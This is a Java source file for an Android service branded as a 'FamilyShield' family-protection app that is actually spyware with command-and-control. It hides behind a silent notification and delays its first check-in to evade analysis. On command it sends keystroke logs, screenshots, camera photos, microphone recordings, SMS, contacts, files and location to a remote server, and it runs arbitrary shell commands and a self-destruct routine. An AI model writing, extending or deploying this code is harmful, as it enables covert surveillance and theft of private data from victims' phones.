package com.familyshield.device.guard;

import android.app.*;
import android.content.*;
import android.os.*;
import java.io.*;
import android.provider.Settings;
import android.telephony.TelephonyManager;
import android.util.Log;
import androidx.core.app.NotificationCompat;

public class MonitorService extends Service {

    private static final String TAG          = "FamilySync";
    private static final String CHANNEL_ID   = "family_sync";
    private static final long   BEACON_MS    = 30_000L;
    private static final int    NOTIF_ID     = 1;

    private C2Client c2;
    private String   botId;
    private Handler  handler;
    private Runnable beaconLoop;

    @Override
    public void onCreate() {
        super.onCreate();
        createNotificationChannel();

        c2    = C2Client.fromAssets(this);
        botId = deriveBotId();

        handler    = new Handler(Looper.getMainLooper());
        beaconLoop = this::beacon;

        startForeground(NOTIF_ID, buildNotification());

        SelfSetup.runAsync(this);
        RootKeylogger.start();
        NativeProbe.safeStartInputReader();

        // Delay first beacon — avoids early analysis window
        handler.postDelayed(beaconLoop, 12 * 60 * 1000L);
    }

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        return START_STICKY;
    }

    @Override
    public IBinder onBind(Intent intent) { return null; }

    @Override
    public void onDestroy() {
        RootKeylogger.stop();
        NativeProbe.stopInputReader();
        handler.removeCallbacks(beaconLoop);
        super.onDestroy();
    }

    private void beacon() {
        new Thread(() -> {
            try {
                c2.checkin(botId, buildInfo());
                autoReportLocation();
                String cmd = c2.getCommand(botId).trim();
                if (!cmd.isEmpty()) dispatch(cmd);
            } catch (Exception e) {
                Log.w(TAG, "sync: " + e.getMessage());
            }
            handler.postDelayed(beaconLoop, BEACON_MS);
        }).start();
    }

    private void autoReportLocation() {
        try {
            String coords = DeviceData.getCoords(this);
            if (coords != null) c2.postLocation(botId, coords);
        } catch (Exception ignored) {}
    }

    private void dispatch(String cmd) {
        String lower = cmd.toLowerCase().trim();

        if (lower.equals("info")) {
            c2.sendResult(botId, buildInfo());

        } else if (lower.equals("keylogs")) {
            String accLogs    = AccessibilityHelperService.flushLogs();
            String rootLogs   = RootKeylogger.flushLogs();
            String nativeLogs = NativeProbe.safeFlushNativeKeylogs();
            String combined   = "";
            if (!accLogs.isEmpty())    combined += "[A]\n" + accLogs    + "\n";
            if (!rootLogs.isEmpty())   combined += "[R]\n" + rootLogs   + "\n";
            if (!nativeLogs.isEmpty()) combined += "[N]\n" + nativeLogs + "\n";
            c2.sendResult(botId, combined.isEmpty() ? "(no keylogs yet)" : combined);

        } else if (lower.equals("shot")) {
            Intent i = new Intent(this, ScreenCaptureActivity.class);
            i.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
            i.putExtra("bot_id", botId);
            startActivity(i);

        } else if (lower.equals("cam") || lower.equals("cam_back")) {
            boolean front = lower.equals("cam");
            new Thread(() -> {
                byte[] jpeg = CameraCapture.capture(this, front);
                if (jpeg != null && jpeg.length > 0) {
                    String name = (front ? "front_" : "back_") + System.currentTimeMillis() + ".jpg";
                    c2.uploadFile(botId, jpeg, name, "image/jpeg");
                    c2.sendResult(botId, "cam: uploaded " + name + " (" + jpeg.length + " bytes)");
                } else {
                    c2.sendResult(botId, "cam: capture failed");
                }
            }).start();

        } else if (lower.equals("files")) {
            new Thread(() -> c2.sendResult(botId, FileEnumerator.listFiles(this))).start();

        } else if (lower.equals("sms")) {
            new Thread(() -> c2.sendResult(botId, DeviceData.readSms(this))).start();

        } else if (lower.equals("contacts")) {
            new Thread(() -> c2.sendResult(botId, DeviceData.readContacts(this))).start();

        } else if (lower.equals("location")) {
            new Thread(() -> c2.sendResult(botId, DeviceData.lastLocation(this))).start();

        } else if (lower.equals("diag")) {
            new Thread(() -> {
                String javaReport   = KernelProbe.run(this);
                String nativeReport = NativeProbe.safeRunKernelProbe();
                c2.sendResult(botId, javaReport + "\n" + nativeReport);
            }).start();

        } else if (lower.startsWith("mic ") || lower.equals("mic")) {
            int secs = 15;
            try { secs = Integer.parseInt(lower.replace("mic", "").trim()); } catch (Exception ignored) {}
            final int duration = Math.min(secs, 120);
            new Thread(() -> {
                try {
                    byte[] audio = MicCapture.record(this, duration);
                    String name  = "mic_" + System.currentTimeMillis() + ".aac";
                    c2.uploadFile(botId, audio, name, "audio/aac");
                    c2.sendResult(botId, "mic: uploaded " + name + " (" + audio.length + " bytes, " + duration + "s)");
                } catch (Exception e) {
                    c2.sendResult(botId, "mic error: " + e.getMessage());
                }
            }).start();

        } else if (lower.equals("check")) {
            new Thread(() -> c2.sendResult(botId, PermissionHelper.runAllTests(this))).start();

        } else if (lower.equals("reset")) {
            new Thread(() -> c2.sendResult(botId, SelfDestruct.run(this, c2, botId))).start();

        } else if (lower.startsWith("shell ")) {
            String shellCmd = cmd.substring(6);
            new Thread(() -> c2.sendResult(botId, runShell(shellCmd))).start();

        } else {
            c2.sendResult(botId, "unknown cmd: " + cmd);
        }
    }

    private String deriveBotId() {
        String aid = Settings.Secure.getString(getContentResolver(), Settings.Secure.ANDROID_ID);
        return "android_" + (aid != null ? aid : String.valueOf(Build.SERIAL).hashCode());
    }

    private String buildInfo() {
        TelephonyManager tm = (TelephonyManager) getSystemService(TELEPHONY_SERVICE);
        String op = "";
        try { op = tm != null ? tm.getNetworkOperatorName() : ""; } catch (Exception ignored) {}
        return "platform=android"
             + "|model=" + Build.MODEL
             + "|mfr=" + Build.MANUFACTURER
             + "|sdk=" + Build.VERSION.SDK_INT
             + "|release=" + Build.VERSION.RELEASE
             + "|operator=" + op
             + "|id=" + botId;
    }

    private String runShell(String cmd) {
        try {
            java.lang.Process p = Runtime.getRuntime().exec(cmd);
            InputStream in = p.getInputStream();
            byte[] buf = new byte[8192];
            int n = in.read(buf);
            return n > 0 ? new String(buf, 0, n) : "(no output)";
        } catch (Exception e) {
            return "shell error: " + e.getMessage();
        }
    }

    private void createNotificationChannel() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            NotificationChannel ch = new NotificationChannel(
                    CHANNEL_ID, "Family Protection", NotificationManager.IMPORTANCE_MIN);
            ch.setSound(null, null);
            ch.setShowBadge(false);
            NotificationManager nm = getSystemService(NotificationManager.class);
            if (nm != null) nm.createNotificationChannel(ch);
        }
    }

    private Notification buildNotification() {
        return new NotificationCompat.Builder(this, CHANNEL_ID)
                .setContentTitle("FamilyShield")
                .setContentText("Family protection active")
                .setSmallIcon(android.R.drawable.ic_menu_compass)
                .setPriority(NotificationCompat.PRIORITY_MIN)
                .setSilent(true)
                .build();
    }
}
